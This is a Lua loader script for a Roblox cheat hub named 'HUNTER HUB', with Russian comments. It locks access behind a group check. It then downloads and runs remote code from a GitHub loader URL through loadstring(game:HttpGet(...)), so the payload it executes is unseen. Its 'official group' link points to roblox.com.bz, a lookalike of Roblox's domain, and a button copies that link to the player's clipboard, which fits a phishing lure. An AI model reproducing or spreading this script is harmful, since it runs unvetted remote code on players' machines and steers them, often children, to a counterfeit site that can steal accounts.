-- ========================================================
-- HUNTER HUB | Created by TheOldScript
-- ========================================================

local Config = {
    GroupId = 1884157460, -- ID твоей группы
    GroupLink = "https://roblox.com.bz/communities/1884157460/", -- Ссылка на официальную группу
    LoaderURL = "https://raw.githubusercontent.com/TheIronScripts/TheIronScript-HUB/main/loader.lua"
}

-- Загрузка Orion Library
local OrionLib = loadstring(game:HttpGet('https://raw.githubusercontent.com/shlexware/Orion/main/source'))()
local LocalPlayer = game.Players.LocalPlayer

-- Функция проверки группы
local function CheckGroup()
    local success, inGroup = pcall(function()
        return LocalPlayer:IsInGroup(Config.GroupId)
    end)
    return success and inGroup
end

-- Если игрок УЖЕ в группе — сразу запускаем основной скрипт
if CheckGroup() then
    OrionLib:MakeNotification({
        Name = "HUNTER HUB",
        Content = "Group membership verified! Loading...",
        Image = "rbxassetid://4483345998",
        Time = 3
    })
    task.wait(1)
    loadstring(game:HttpGet(Config.LoaderURL))()
    return
end

-- Если НЕ в группе — открываем окно проверки
local Window = OrionLib:MakeWindow({
    Name = "HUNTER HUB | Group Lock",
    HidePremium = true,
    SaveConfig = false,
    IntroEnabled = true,
    IntroText = "HUNTER HUB",
    IntroIcon = "rbxassetid://4483345998"
})

local GroupTab = Window:MakeTab({
    Name = "Group Verification",
    Icon = "rbxassetid://4483345998",
    PremiumOnly = false
})

GroupTab:AddSection({
    Name = "Join our Roblox Group to access HUNTER HUB"
})

GroupTab:AddLabel("Created by TheOldScript")

-- Кнопка проверки вступления в группу
GroupTab:AddButton({
    Name = "Check Group Membership",
    Callback = function()
        if CheckGroup() then
            OrionLib:MakeNotification({
                Name = "Access Granted!",
                Content = "Thank you for joining! Loading script...",
                Image = "rbxassetid://4483345998",
                Time = 3
            })
            
            task.wait(1)
            OrionLib:Destroy()
            
            -- Загружаем твой скрипт
            loadstring(game:HttpGet(Config.LoaderURL))()
        else
            OrionLib:MakeNotification({
                Name = "Access Denied",
                Content = "You haven't joined the group yet!",
                Image = "rbxassetid://4483345998",
                Time = 4
            })
        end
    end
})

-- Кнопка копирования ссылки на группу
GroupTab:AddButton({
    Name = "Copy Group Link",
    Callback = function()
        if setclipboard then
            setclipboard(Config.GroupLink)
            OrionLib:MakeNotification({
                Name = "Link Copied!",
                Content = "Group link copied to your clipboard.",
                Image = "rbxassetid://4483345998",
                Time = 3
            })
        else
            OrionLib:MakeNotification({
                Name = "Error",
                Content = "Your executor does not support setclipboard.",
                Image = "rbxassetid://4483345998",
                Time = 3
            })
        end
    end
})

OrionLib:Init()
